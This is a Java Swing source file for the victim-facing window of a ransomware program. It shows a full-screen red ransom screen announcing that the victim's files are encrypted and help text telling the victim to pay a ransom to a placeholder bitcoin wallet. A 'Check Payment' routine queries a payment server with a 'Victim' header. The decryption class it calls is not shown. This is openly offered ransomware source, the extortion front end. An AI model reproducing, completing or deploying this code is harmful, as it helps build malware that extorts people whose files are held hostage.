import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStreamReader;

public class launcher{
    private JFrame frame;
    private JPanel panel;
    private JLabel label;

    //Data Encapsulation
    public void launcher(){
        prepareGUI();
    }

    public static void main(String[] args){
        launcher launch = new launcher();
        launch.launcher();
    }

    private void prepareGUI(){
        frame = new JFrame("Ransomware Decorytion Tool");

        frame.setDefaultCloseOperation(frame.DO_NOTHING_ON_CLOSE);
        frame.setSize(1980, 1080);
        frame.getContentPane().setBackground(Color.RED);

        JPanel panel2 = new JPanel();
        label = new JLabel("<html><h1>Opps! Your files have been encrypted!</h1></html>");
        label.setForeground(Color.BLACK);
        panel2.add(label);

        JMenuBar mb = new JMenuBar();
        JMenu m1 = new JMenu("Options");
        JMenu m2 = new JMenu("Help");
        mb.add(m1);
        mb.add(m2);

        //To be implemented in future release
        JMenuItem m11 = new JMenuItem("Load Key");

        JMenuItem m12 = new JMenuItem("Close");
        JMenuItem m21 = new JMenuItem("How to Get my Files Back?");
        m1.add(m11);
        m1.add(m12);
        m2.add(m21);

        JButton button1 = new JButton("Decrypt!");
        JButton button2 = new JButton("Check Payment");

        //Implement actions for all buttons
        button1.addActionListener(new DecryptListener());
        button2.addActionListener(new checkPayment());
        m12.addActionListener(new CloseListener());
        m21.addActionListener(new HelpListener());

        // Customizing the buttons
        button1.setFont(new Font("Serif", Font.ITALIC, 30));
        button2.setFont(new Font("Serif", Font.ITALIC, 30));

        // Create a new panel
        panel = new JPanel();
        panel.setBackground(Color.RED);

        //Add them to panel
        panel.add(button1);
        panel.add(button2);

        frame.add(BorderLayout.NORTH,mb);
        frame.add(BorderLayout.NORTH,panel2);
        frame.add(BorderLayout.SOUTH,panel);
        frame.setVisible(true);
    }
}

class checkPayment implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        try{
            int id = 1;
            URL obj = new URL("http://127.0.0.1/check_payment.php?id="+id);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("GET");
            con.addRequestProperty("Victim", "Yes");
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
	    	String inputLine;
            StringBuffer response = new StringBuffer();
            while((inputLine = in.readLine()) != null){
                response.append(inputLine);
            }
            in.close();
            String ans  =response.toString();
            JFrame frame3 = new JFrame("Staus!");
            frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
            JLabel label2 = new JLabel("<html>"+ans+"</html>");
            frame3.setSize(500,200);
            JButton button4 = new JButton("Close");
            JPanel panel2 = new JPanel();
            panel2.add(button4);
            ActionListener closeFrame3 = new ActionListener(){
                @Override
                public void actionPerformed(ActionEvent e){
                    frame3.dispose();
                }
            };
            button4.addActionListener(closeFrame3);
            frame3.add(BorderLayout.CENTER,label2);
            frame3.add(BorderLayout.SOUTH,panel2);
            frame3.setVisible(true);
        }
        catch (IOException er){
            er.printStackTrace();
        }
    }
}

//Event handler for "Decrypt" Button
class DecryptListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        try{
            decrypt dec = new decrypt();
            dec.validatePayment();
            JFrame frame3 = new JFrame("Decrypton Done!");
            frame3.getContentPane().setBackground(Color.GREEN);
            frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
            JLabel label3 = new JLabel("File have been decrypted!",SwingConstants.CENTER);
            label3.setForeground(Color.RED);
            frame3.setSize(500,200);
            JButton button4 = new JButton("close");
            JPanel panel = new JPanel();
            panel.setBackground(Color.GREEN);
            panel.add(button4);
            ActionListener closeFrame3 = new ActionListener(){
                @Override
                public void actionPerformed(ActionEvent e){
                    frame3.dispose();
                }
            };
            button4.addActionListener(closeFrame3);
            frame3.add(BorderLayout.CENTER,label3);
            frame3.add(BorderLayout.SOUTH,panel);
            frame3.setVisible(true);
        }
        catch (Exception err){
            err.printStackTrace();
        }
    }
}
//Event handler for "Close" button
class CloseListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        System.exit(0);
    }
}
//Event handler for "How to get my files back?" button
class HelpListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        JFrame frame2 = new JFrame("Get files back!");
        frame2.setDefaultCloseOperation(frame2.DISPOSE_ON_CLOSE);
        JLabel label2 = new JLabel("<html><ul>" + 
                                    "<li>Pay the ransom to bitcoin_wallet_addr</li>"+
                                    "<li>Once payed you just need to press decrypt button</li>"+
                                    "<li>Private key will be automatically loaded</li>"+
                                    "</ul></html>");
        frame2.setSize(500,200);
        JButton button3 = new JButton("Close");
        JPanel panel = new JPanel();
        panel.add(button3);
        ActionListener closeFrame2 = new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e){
                frame2.dispose();
            }
        };
        button3.addActionListener(closeFrame2);
        frame2.add(BorderLayout.CENTER,label2);
        frame2.add(BorderLayout.SOUTH,panel);
        frame2.setVisible(true);
    }
}